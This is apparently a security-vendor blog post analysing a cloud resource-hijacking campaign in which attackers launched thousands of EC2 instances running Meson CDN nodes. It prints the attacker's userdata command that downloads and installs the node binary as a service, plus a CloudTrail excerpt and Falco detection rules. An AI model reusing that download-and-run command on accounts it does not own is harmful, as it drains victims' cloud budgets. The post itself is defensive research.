---
title: Cloud Threats Deploying Crypto CDN
url: "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
author: Stefano Chierici
published: 2024-03-11
source_type: article
source_domain: sysdig.com
cleanup_method: llm
---

[< back to blog](https://sysdig.com/blog)

# Cloud Threats Deploying Crypto CDN

![Image 7: Stefano Chierici](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/687180a75cae488b8566ad3d_833e5d66c495fcd9c4f01c6fc69d87c3.jpeg)![Image 8: Cloud Threats Deploying Crypto CDN](https://cdn.prod.website-files.com/681a1c8e5b6ebfc0f8529533/68b6896943ff1c196588aac3_sysdig-avatar.svg)

Published by:

Stefano Chierici

![Image 11: Cloud Threats Deploying Crypto CDN](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/69c5a186729b29377631e352_6877bc8d28aff0d6b7345249_image-105.png)


The Sysdig Threat Research Team (TRT) discovered a malicious campaign using the blockchain-based Meson service to reap rewards ahead of the crypto token unlock happening around March 15th. **Within minutes, the attacker attempted to create 6,000 Meson Network nodes using a compromised cloud account.** The Meson Network is a decentralized content delivery network (CDN) that operates in Web3 by establishing a streamlined bandwidth marketplace through a blockchain protocol.

[![Image 14](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b7345209_CDN-Threat-Diagram-1170x225.png)](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b7345209_CDN-Threat-Diagram-1170x225.png)

In this article, we cover what happened in the observed attack, further explain what the Meson Network is, and describe how the attacker was able to use it to their advantage.

## What Happened

On February 26th, the Sysdig TRT responded to suspicious alerts for multiple AWS users associated with exposed services within our honeynet infrastructure. The attacker exploited [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account. Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users to create a large number of EC2 instances.

The EC2 instances were created in the account using _RunInstances_ with the following _userdata_. The _userdata_ field allows for commands to be run when an EC2 instance starts.

```javascript
wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn
sudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30
sudo ./service start meson_cdn
```

The commands shown above download the meson_cdn binary and run it as a service. This code can be found in the official Meson network [documentation](https://docs.meson.network/nodes/run-meson-nodes.html).

Analysis of the Cloudtrail logs showed the attacker came from a single IP Address 13[.]208[.]251[.]175. The compromised account experienced malicious activity across many AWS regions. The attacker used a public AMI (Ubuntu 22.04) and spawned multiple batches of 500 micro-sized instances per region, as reported in the following log. We had a limit set on the account for new EC2 creation to only micro-sized instances, otherwise we're sure the attacker would have certainly preferred larger, more expensive instances.

```javascript
"eventTime": "2024-02-26T20:33:10Z",
    …
    "userAgent": "Boto3/1.34.49 md/Botocore#1.34.49 ua/2.0 os/linux#6.2.0-1017-aws md/arch#x86_64 lang/python#3.10.12 md/pyimpl#CPython cfg/retry-mode#legacy Botocore/1.34.49 Resource",
    "requestParameters": {
        "instancesSet": {
            "items": [
                {
                    "imageId": "ami-0a2e7efb4257c0907",
                    "minCount": 500,
                    "account": 500
                }
```

Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions and execute the meson_cdn binary. This comes at a huge cost for the account owner. **As a result of the attack, we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!** Estimating the reward tokens amount and value the attacker could earn is difficult since those Meson tokens haven't had values set yet in the public market.

Looking inside one of the instances created, we can see the `meson_cdn` process started correctly using the default configuration.

[![Image 15](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b7345205_image1-86.png)](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b7345205_image1-86.png)

```javascript
cat default.toml 

end_point = "https://cdn.meson.network"

https_port = 443

token = "ami-03f4878755434977f"

[cache]

  folder = "./m_cache"

  size = 30

[log]

  level = "INFO"
```

While monitoring the `meson_cdn` process's system calls it's possible to find the file exchanged between the CDN. As you can see in the screenshot below of system calls, a file has been created containing an image.

[![Image 16](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b734520e_image2-77-1170x147.png)](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877bc8d28aff0d6b734520e_image2-77-1170x147.png)

Checking the files created in the _m\_cache_ folder, we can find different content like image and messages like:

```javascript
{"name":"GAS#30","description":"{GAS} - {GOLDAPESQUAD} - RARITIES INCLUDED, LAYERS 
ON LAYERS, COME TO DISCORD TO SHOW OFF YOUR APE!","image":"<a 
href="https://nftstorage.link/ipfs/bafybeicr3csbrrdo2h3g27ddu3sfppwzdfrufzpwm24qcmzbmy6jjuzydy/72">
https://nftstorage.link/ipfs/bafybeicr3csbrrdo2h3g27ddu3sfppwzdfrufzpwm24qcmzbmy6jjuzydy/72
</a>","attributes":[{"trait_type":"APE PICS","value":"Download (82)"},{"trait_type":"BACKPICS","value":"Ai(4)"}
{"trait_type":"Rarity Rank","value":363,"display_type":"number"}],"properties":{"files":[{"uri":"<a 
href="https://nftstorage.link/ipfs/bafybeicr3csbrrdo2h3g27ddu3sfppwzdfrufzpwm24qcmzbmy6jjuzydy/72">https://nftstorage.l
ink/ipfs/bafybeicr3csbrrdo2h3g27ddu3sfppwzdfrufzpwm24qcmzbmy6jjuzydy/72</a>"}]}}
```

Contrary to what we expected, the Meson application used a relatively low percentage of memory and CPU usage compared to traditional crypto jacking incidents. To better understand why this is and why we are seeing image storage let's dig deeper on what Meson Network actually does.

## What is Web3 and the Meson Network

[Meson Network](https://docs.meson.network/#what-meson-network-is) is a blockchain project committed to creating an efficient bandwidth marketplace on Web3, using a blockchain protocol model to replace the traditional cloud storage solutions like Google Drive or Amazon S3 which are more expensive and have privacy limitations.

For those who are not familiar with Web3, it is presented as an upgrade to its precursors: web 1.0 and 2.0. This new concept of a new decentralized internet is based on blockchain network, cryptocurrencies, and NFTs and claims to prioritize decentralization, redistributing ownership to users and creators for a fairer digital landscape.

To accomplish this goal, Web3 requires some basic conditions:

*   bandwidth to let the entire network be efficient 
*   storage to achieve decentralization

In this attack, we don't talk about crypto mining in the traditional terms of memory or CPU cycles usage, but rather bandwidth and storage in return for Meson Network Tokens (MSN). The Meson [documentation](https://docs.meson.network/nodes/) gives this explanation:

**Mining Score = Bandwidth Score * Storage Score * Credit Score**

This means miners will receive Meson tokens as a reward for providing servers to the Meson Network platform, and the reward will be calculated based on the amount of bandwidth and storage brought into the network.

Going back to what we observed during the attack, this explains why the attack didn't result in the usual massive amount of CPU being used but instead a huge number of connections.

## New trend, new threats

The fact that Meson network is getting some hype in the blockchain world isn't a mystery after Initial Coin Offerings (ICO) happened Feb 8th 2024. As we saw, it is the perfect time for mining to inject liquidity and bring interest into a new coin.

The Sysdig TRT monitored a spike in images pushed on dockerhub recently related to Meson network and related features, reinforcing the interest in this service. One of the container images on DockerHub we analyzed is [wawaitech/meson](https://hub.docker.com/r/wawaitech/meson) was created around 1 month ago and runs [_gaganode_](https://www.gaganode.com/)_,_ a Meson network product related to decentralized edge cloud computing.

The image looks legitimate and safe from a static point of view, which involves analyzing its layers and vulnerabilities. However, during runtime execution, we monitored outbound network traffic and we spotted gaganode being executed and performing connections to malicious IPs.

## Same old cryptomining attack?

Yes and no. Attackers still want to use your resources for their goal and that hasn't changed at all. What is different is the resources requested. For Meson, the attacker is more interested in storage space and high bandwidth instead of high performance CPUs. This can be achieved with a large number of small instances but with a good amount of storage.

Thanks to the ease of scalability in the cloud, spawning a large amount of resources is trivial and it can be done very quickly across multiple regions. Attackers can have their own CDNs ready in minutes and for free (to them)!

## Detection

Knowing the differences between the usual miners we are used to seeing, you may wonder if the usual detection is still effective.

While usual miners are detectable looking spikes on CPU usage, as we saw this won't be the case. However we can still monitor other resources like instance storage space and connections. A spike in traffic usage and storage would be a red flag you should carefully look into.

Talking about runtime detection, using [Falco](https://falco.org/) we could monitor outbound connections done by the host. The following Falco rules can help in detecting those malicious behaviors.

```javascript
- rule: Unexpected outbound connection destination

  desc: Detect any outbound connection to a destination outside of an allowed set of ips, networks, or domain names

  condition: >

    consider_all_outbound_conns and outbound

  output: Disallowed outbound connection destination (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid)

  priority: NOTICE
```

Looking at cloud events instead, you could monitor instances created in the cloud. The following rule for Cloudtrail can help monitor``_`RunInstances`_ events.

```javascript
- rule: Run Instances

  desc: Detect launching of a specified number of instances.

  condition: >

ct.name="RunInstances" and not ct.error exists

  output: A number of instances have been launched on zones %ct.request.availabilityzone with subnet ID %ct.request.subnetid by user %ct.user on region %ct.region (requesting user=%ct.user, requesting IP=%ct.srcip, account ID=%ct.user.accountid, AWS region=%ct.region, arn=%ct.user.arn, availability zone=%ct.request.availabilityzone, subnet id=%ct.request.subnetid, reservation id=%ct.response.reservationid)

  priority: WARNING

  source: awscloudtrail
```

Another detection perspective might be monitoring unused AWS regions where commands aren't executed. To properly use the following rules without noise, the list _`disallowed\_aws\_regions`_ needs to be properly customized adding the unused regions in your account.

```javascript
- rule: AWS Command Executed on Unused Region

  desc: Detect AWS command execution on unused regions.

  condition: >

not ct.error exists and ct.region in (disallowed_aws_regions)

   output: An AWS command of source %ct.src and name %ct.name has been executed by an untrusted user %ct.user on an unused region=%ct.region (requesting user=%ct.user, requesting IP=%ct.srcip, account ID=%ct.user.accountid, AWS region=%ct.region)

  priority: CRITICAL

  source: awscloudtrail
```

## Conclusion

Attackers are continuing to diversify their income streams through new ways of leveraging compromised assets. It isn't all about mining cryptocurrency anymore. Services like Meson network want to leverage hard drive space and network bandwidth instead of CPU. While Meson may be a legitimate service, this shows that attackers are always on the lookout for new ways to make money.

In order to prevent your resources from getting wrapped up in one of these attacks and having to shell out thousands of dollars for resource consumption, it is critical to keep your software up to date and monitor your environments for suspicious activity.
